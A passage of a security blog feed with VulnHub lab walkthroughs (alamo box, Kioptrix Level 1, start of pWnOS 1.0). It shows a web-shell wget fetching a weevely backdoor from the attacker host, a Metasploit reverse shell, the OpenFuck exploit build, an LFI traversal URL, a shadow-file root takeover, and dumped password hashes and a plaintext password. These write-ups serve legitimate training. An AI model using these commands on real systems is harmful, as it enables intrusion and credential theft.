<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.142/b.php?cmd=id">http://192.168.80.142/b.php?cmd=id&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.80.142/b.php?cmd=wget">http://192.168.80.142/b.php?cmd=wget&lt;/a> 192.168.80.137/weevely.php.txt -O c.php</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# weevely &lt;a href="http://192.168.80.142/c.php">http://192.168.80.142/c.php&lt;/a> 1234</span></code></pre></td></tr></table></div></figure></p>

<p>Note that there exists also a trivial solution, because users can upload php
shell to home directory, which can be invoked without any restriction.</p>

<p>If we read the discussion on web server, someone is asking about port knocking.
We download the data to our server:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/etc/knockknock.d/profiles/alamo $&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# find .knockknock/
</span><span class='line'>.knockknock/
</span><span class='line'>.knockknock/192.168.80.142
</span><span class='line'>.knockknock/192.168.80.142/config
</span><span class='line'>.knockknock/192.168.80.142/counter
</span><span class='line'>.knockknock/192.168.80.142/mac.key
</span><span class='line'>.knockknock/192.168.80.142/cipher.key</span></code></pre></td></tr></table></div></figure></p>

<p>From the vulnerable server, we download and use knockknock too:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.knockknock# knockknock -p 22 192.168.80.142
</span><span class='line'>*** Success: knock sent.
</span><span class='line'>root@kali32:~/.knockknock# ssh &lt;a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#97;&#x6c;&#97;&#109;&#x6f;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#56;&#x30;&#x2e;&#x31;&#x34;&#50;">&#97;&#x6c;&#x61;&#109;&#111;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x38;&#x30;&#x2e;&#x31;&#52;&#x32;&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The authenticity of host &lsquo;192.168.80.142 (192.168.80.142)&rsquo; can&rsquo;t be established.
</span><span class='line'>RSA key fingerprint is 03:73:de:c7:17:96:0b:bb:8c:8e:c7:87:9b:5b:d5:c9.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)?</span></code></pre></td></tr></table></div></figure></p>

<p>We log in as alamo / Ih@cK3dM1cR05oF7.</p>

<p>Because nobody has higher privileges for sudo except www-data, we use the web
account to obtain root privileges.
One way of doing this is to change using chown /etc/shadow the file permissions
to www-data, move to /tmp and change the root hash to a know one (e.g.
alamo&rsquo;s). Then we move the shadow file back.</p>

<p>In the end we log in as root with Ih@cK3dM1cR05oF7 password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>uid=0(root) gid=0(root) groups=0(root)&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/kioptrix-level-1/"/>
    <updated>2015-05-10T13:34:07+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
</span><span class='line'>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>111/tcp  open  rpcbind     2 (RPC #100000)
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
</span><span class='line'>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>1024/tcp open  status      1 (RPC #100024)</span></code></pre></td></tr></table></div></figure></p>

<p>Enumeration of Samba:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# nmblookup -A 192.168.0.26
</span><span class='line'>Looking up status of 192.168.0.26
</span><span class='line'>        KIOPTRIX        &lt;00> -         B &lt;ACTIVE>
</span><span class='line'>        KIOPTRIX        &lt;03> -         B &lt;ACTIVE>
</span><span class='line'>        KIOPTRIX        &lt;20> -         B &lt;ACTIVE>
</span><span class='line'>        ..&lt;strong>MSBROWSE&lt;/strong>. &lt;01> - &lt;GROUP> B &lt;ACTIVE>
</span><span class='line'>        MYGROUP         &lt;00> - &lt;GROUP> B &lt;ACTIVE>
</span><span class='line'>        MYGROUP         &lt;1d> -         B &lt;ACTIVE>
</span><span class='line'>        MYGROUP         &lt;1e> - &lt;GROUP> B &lt;ACTIVE>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    MAC Address = 00-00-00-00-00-00
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:/usr/share/exploitdb# smbclient -L\ -I 192.168.0.26
</span><span class='line'>Enter root&rsquo;s password:
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    Sharename       Type      Comment
</span><span class='line'>    ---------       ----      -------
</span><span class='line'>    IPC$            IPC       IPC Service (Samba Server)
</span><span class='line'>    ADMIN$          IPC       IPC Service (Samba Server)
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>Anonymous login successful
</span><span class='line'>Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    Server               Comment
</span><span class='line'>    ---------            -------
</span><span class='line'>    KIOPTRIX             Samba Server
</span><span class='line'>
</span><span class='line'>    Workgroup            Master
</span><span class='line'>    ---------            -------
</span><span class='line'>    MYGROUP              KIOPTRIX
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>The service is running with the root privileges and we can use exploit in Metasploit to obtain root account:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf > use exploit/linux/samba/trans2open
</span><span class='line'>msf exploit(trans2open) > setg RHOST 192.168.80.141
</span><span class='line'>RHOST => 192.168.80.141
</span><span class='line'>msf exploit(trans2open) > exploit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[&lt;em>] Started reverse handler on 192.168.80.137:4444
</span><span class='line'>[&lt;/em>] Trying return address 0xbffffdfc&hellip;
</span><span class='line'>[&lt;em>] Trying return address 0xbffffcfc&hellip;
</span><span class='line'>[&lt;/em>] Trying return address 0xbffffbfc&hellip;
</span><span class='line'>[&lt;em>] Trying return address 0xbffffafc&hellip;
</span><span class='line'>[&lt;/em>] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.141:1026) at 2015-04-27 06:43:53 +0200</span></code></pre></td></tr></table></div></figure></p>

<p>Because Apache is vulnerable, there is another solution. Nikto reports something interesting:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</span></code></pre></td></tr></table></div></figure></p>

<p>Web server signature:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span></code></pre></td></tr></table></div></figure></p>

<p>In exploitdb we find:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c) | /linux/remote/764.c</span></code></pre></td></tr></table></div></figure></p>

<p>Because the exploit is pretty old, we need to update it with these <a href="https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">steps</a>:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>include &lt;openssl/rc4.h>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>include &lt;openssl/md5.h>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>&hellip;
</span><span class='line'>&lt;a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c&lt;/a>
</span><span class='line'>&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>gcc -o OpenFuck 764.c -lcrypto&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Finally we run the exploit and cat /etc/shadow with the root privileges.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/shadow
</span><span class='line'>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
</span><span class='line'>bin:&lt;em>:14513:0:99999:7:::
</span><span class='line'>daemon:&lt;/em>:14513:0:99999:7:::
</span><span class='line'>adm:&lt;em>:14513:0:99999:7:::
</span><span class='line'>lp:&lt;/em>:14513:0:99999:7:::
</span><span class='line'>sync:&lt;em>:14513:0:99999:7:::
</span><span class='line'>shutdown:&lt;/em>:14513:0:99999:7:::
</span><span class='line'>halt:&lt;em>:14513:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:14513:0:99999:7:::
</span><span class='line'>&lt;a href="news:*:14513:0:99999:7:::">news:*:14513:0:99999:7:::&lt;/a>
</span><span class='line'>uucp:&lt;em>:14513:0:99999:7:::
</span><span class='line'>operator:&lt;/em>:14513:0:99999:7:::
</span><span class='line'>games:&lt;em>:14513:0:99999:7:::
</span><span class='line'>gopher:&lt;/em>:14513:0:99999:7:::
</span><span class='line'>&lt;a href="ftp:*:14513:0:99999:7:::">ftp:*:14513:0:99999:7:::&lt;/a>
</span><span class='line'>nobody:*:14513:0:99999:7:::
</span><span class='line'>mailnull:!!:14513:0:99999:7:::
</span><span class='line'>rpm:!!:14513:0:99999:7:::
</span><span class='line'>xfs:!!:14513:0:99999:7:::
</span><span class='line'>rpc:!!:14513:0:99999:7:::
</span><span class='line'>rpcuser:!!:14513:0:99999:7:::
</span><span class='line'>nfsnobody:!!:14513:0:99999:7:::
</span><span class='line'>nscd:!!:14513:0:99999:7:::
</span><span class='line'>ident:!!:14513:0:99999:7:::
</span><span class='line'>radvd:!!:14513:0:99999:7:::
</span><span class='line'>postgres:!!:14513:0:99999:7:::
</span><span class='line'>apache:!!:14513:0:99999:7:::
</span><span class='line'>squid:!!:14513:0:99999:7:::
</span><span class='line'>pcap:!!:14513:0:99999:7:::
</span><span class='line'>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
</span><span class='line'>harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pWnOS: 1.0]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0/"/>
    <updated>2015-05-10T12:13:34+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure></p>

<p>After a while of browsing the web page, we found trivial LFI vulnerability:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://193.168.0.25/index1.php?help=true&amp;connect=../../../../etc/passwd">http://193.168.0.25/index1.php?help=true&amp;connect=../../../../etc/passwd&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>We can find a lot of information querying the samba service too:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/vulnhub/pwnos# nmblookup -A 192.168.0.25
</span><span class='line'>Looking up status of 192.168.0.25
</span><span class='line'>        UBUNTUVM        &lt;00> -         H &lt;ACTIVE>
</span><span class='line'>        UBUNTUVM        &lt;03> -         H &lt;ACTIVE>
</span><span class='line'>        UBUNTUVM        &lt;20> -         H &lt;ACTIVE>
</span><span class='line'>        ..&lt;strong>MSBROWSE&lt;/strong>. &lt;01> - &lt;GROUP> H &lt;ACTIVE>
</span><span class='line'>        MSHOME          &lt;1d> -         H &lt;ACTIVE>
</span><span class='line'>        MSHOME          &lt;1e> - &lt;GROUP> H &lt;ACTIVE>
</span><span class='line'>        MSHOME          &lt;00> - &lt;GROUP> H &lt;ACTIVE>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    MAC Address = 00-00-00-00-00-00
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali:~/vulnhub/pwnos# smbclient -L\UBUNTUVM -I 192.168.0.25 -N
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    Sharename       Type      Comment
</span><span class='line'>    ---------       ----      -------
</span><span class='line'>    home            Disk      Home Directory for vmware User
</span><span class='line'>    print$          Disk      Printer Drivers
</span><span class='line'>    IPC$            IPC       IPC Service (ubuntuvm)
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>Anonymous login successful
</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    Server               Comment
</span><span class='line'>    ---------            -------
</span><span class='line'>    UBUNTUVM             ubuntuvm
</span><span class='line'>
</span><span class='line'>    Workgroup            Master
</span><span class='line'>    ---------            -------
</span><span class='line'>    MSHOME               UBUNTUVM
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>There are a few enumeration modules in metasploit:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) > use auxiliary/scanner/smb/pipe_auditor
</span><span class='line'>msf auxiliary(pipe_auditor) > setg RHOSTS 192.168.0.25
</span><span class='line'>RHOSTS => 192.168.0.25
</span><span class='line'>msf auxiliary(pipe_auditor) > exploit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[&lt;em>] 192.168.0.25 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \lsass, \ntsvcs, \srvsvc, \wkssvc
</span><span class='line'>[&lt;/em>] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>msf auxiliary(smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers
</span><span class='line'>msf auxiliary(smb_enumusers) > exploit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] 192.168.0.25 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd, man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>msf auxiliary(smb_login) > use auxiliary/scanner/smb/smb_lookupsid
</span><span class='line'>msf auxiliary(smb_lookupsid) > exploit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[&lt;em>] 192.168.0.25 PIPE(LSARPC) LOCAL(UBUNTUVM - 5-21-2952145021-507220021-499326276) DOMAIN(MSHOME - )
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=nobody RID=501
</span><span class='line'>[&lt;em>] 192.168.0.25 GROUP=None RID=513
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=root RID=1000
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=daemon RID=1002
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=bin RID=1004
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=sys RID=1006
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=sync RID=1008
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=games RID=1010
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=man RID=1012
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=lp RID=1014
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=mail RID=1016
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=news RID=1018
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=uucp RID=1020
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=proxy RID=1026
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=www-data RID=1066
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=backup RID=1068
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=list RID=1076
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=irc RID=1078
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=gnats RID=1082
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=dhcp RID=1200
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=syslog RID=1202
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=klog RID=1204
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=mysql RID=1206
</span><span class='line'>[&lt;em>] 192.168.0.25 USER=sshd RID=1208
</span><span class='line'>[&lt;/em>] 192.168.0.25 USER=vmware RID=3000
</span><span class='line'>[&lt;em>] 192.168.0.25 UBUNTUVM [nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, dhcp, syslog, klog, mysql, sshd, vmware ]
</span><span class='line'>[&lt;/em>] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></p>

<p>The webmin is vulnerable and the exploit in metasploit:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Name: Webmin File Disclosure
</span><span class='line'>     Module: auxiliary/admin/webmin/file_disclosure
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Normal
</span><span class='line'>  Disclosed: 2006-06-30</span></code></pre></td></tr></table></div></figure></p>

<p>Basically the exploitation could be performed on command line to disclose arbitrary file, for example:
